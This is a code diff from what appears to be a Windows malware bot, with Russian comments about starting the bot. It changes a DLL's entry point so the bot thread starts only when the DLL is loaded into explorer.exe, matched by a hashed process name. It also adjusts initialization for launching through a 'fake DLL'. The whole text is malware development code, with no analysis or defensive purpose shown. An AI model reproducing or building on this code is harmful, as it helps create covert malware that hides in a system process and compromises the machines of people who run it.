@@ -131,8 +131,6 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 DWORD WINAPI ExplorerMain(LPVOID Data)
 {
-	BOT::Initialize();
-
 	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
 	
 	//UnhookDlls();
@@ -186,12 +184,15 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved)
 {
-
+	char buf[MAX_PATH];
 	switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
 			BOT::Initialize();
-			StartThread(ExplorerMain, NULL);
+			pGetModuleFileNameA( NULL, buf, MAX_PATH );
+			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
+			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
+				StartThread(ExplorerMain, NULL);
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -206,6 +207,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
+	BOT::Initialize();
 	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
 	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
@@ -216,7 +218,7 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 // Експортируемая ф-ция для запуска Bot.plug из FakeDll.
 BOOL WINAPI StartFromFakeDll()
 {
-	BOT::Initialize();
+//	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "Started.");
 
 	// Смотрим на то - запущен ли бот
